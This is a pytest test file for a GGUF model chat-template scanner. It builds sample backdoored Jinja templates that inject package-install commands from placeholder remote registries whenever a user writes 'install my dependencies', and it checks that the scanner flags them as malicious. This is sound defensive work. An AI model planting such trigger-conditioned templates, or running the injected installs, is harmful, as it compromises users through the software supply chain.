from __future__ import annotations

import json

import pytest

from pillar_gguf_scanner import GGUFTemplateScanner, Severity, Verdict, cli as scanner_cli
from pillar_gguf_scanner.classifier import TemplateClassifier
from pillar_gguf_scanner.supply_chain import extract_supply_chain_features

INSTALL_COMMANDS = [
    "npm install github:owner/package",
    "pnpm add https://registry.example/package.tgz",
    "yarn add git+https://git.example/owner/package.git",
    "bun add package-name",
    "pip install --index-url https://packages.example/simple package-name",
    "uv add git+https://git.example/owner/package.git",
    "poetry add package-name",
    "conda install --channel https://packages.example/channel package-name",
    "cargo install --git https://git.example/owner/project",
    "go get example.com/owner/module@latest",
    "gem install --source https://gems.example package-name",
    "composer require owner/package",
    "dotnet add package Package.Name",
    "mvn dependency:get -Dartifact=example:package:1.0.0",
    'remotes::install_github("owner/package")',
    'Pkg.add(url="https://git.example/owner/package.git")',
    "apt-get install package-name",
    "docker pull registry.example/owner/image:latest",
]


def _conditional_template(command: str) -> str:
    return (
        "{% for message in messages %}"
        "{% if message.role == 'user' and "
        "(((message.content | lower).split('install my dependencies')) | length) > 1 %}"
        f"{{{{ '{command}' }}}}"
        "{% endif %}"
        "{% endfor %}"
    )


@pytest.mark.parametrize("command", INSTALL_COMMANDS)
def test_conditional_install_actions_are_malicious(gguf_template_factory, command: str) -> None:
    path = gguf_template_factory(default_template=_conditional_template(command))

    result = GGUFTemplateScanner().scan_path(path)

    matches = [finding for finding in result.findings if finding.rule_id == "supply_chain_install_action"]
    assert matches
    assert matches[0].severity == Severity.HIGH
    assert matches[0].metadata["conditional"] is True
    assert result.verdict == Verdict.MALICIOUS


def test_plain_installer_documentation_is_not_flagged(gguf_template_factory) -> None:
    path = gguf_template_factory(default_template="Setup documentation: npm install package-name")

    result = GGUFTemplateScanner().scan_path(path)

    assert not [finding for finding in result.findings if finding.rule_id == "supply_chain_install_action"]
    assert not [finding for finding in result.findings if finding.rule_id == "base64_payload"]
    assert result.verdict == Verdict.CLEAN


def test_jinja_comments_do_not_count_as_install_actions(gguf_template_factory) -> None:
    path = gguf_template_factory(
        default_template=(
            "{# Example only: pip install https://packages.example/"
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.whl #}"
            "{{ message.content }}"
        )
    )

    result = GGUFTemplateScanner().scan_path(path)

    assert not [finding for finding in result.findings if finding.rule_id == "supply_chain_install_action"]
    assert not [finding for finding in result.findings if finding.rule_id == "base64_payload"]


def test_commit_sha_inside_url_is_not_reported_as_base64(gguf_template_factory) -> None:
    path = gguf_template_factory(
        default_template=("https://github.com/example/package/archive/7b36d04bea6b00762cb0f3a34778ce7574cd11b4.tar.gz")
    )

    result = GGUFTemplateScanner().scan_path(path)

    assert not [finding for finding in result.findings if finding.rule_id == "base64_payload"]


def test_supply_chain_feature_extraction_distinguishes_conditional_remote_install() -> None:
    features = extract_supply_chain_features(
        _conditional_template(
            "npm install --save-dev https://github.com/pillar-labs/agent-template-supply-chain-demo-package"
        )
    )

    assert features["install_action_count"] == 1
    assert features["has_conditional_install"] == 1
    assert features["has_remote_install"] == 1
    assert features["conditional_or_remote_install"] == 1


def test_packaged_classifier_marks_conditional_supply_chain_install_malicious() -> None:
    result = TemplateClassifier().classify(
        _conditional_template(
            "npm install --save-dev https://github.com/pillar-labs/agent-template-supply-chain-demo-package"
        ),
        template_name="default",
    )

    assert result.verdict == Verdict.MALICIOUS
    assert result.confidence > 0.5


def test_cli_reports_conditional_supply_chain_install_as_malicious(capsys, gguf_template_factory) -> None:
    path = gguf_template_factory(
        default_template=_conditional_template(
            "npm install --save-dev https://github.com/pillar-labs/agent-template-supply-chain-demo-package"
        )
    )

    exit_code = scanner_cli.main(["--json", "--no-pillar", str(path)])
    payload = json.loads(capsys.readouterr().out)

    assert exit_code == 1
    assert payload["verdict"] == "malicious"
    assert any(finding["rule_id"] == "supply_chain_install_action" for finding in payload["findings"])
    assert payload["classifier_results"][0]["verdict"] == "malicious"
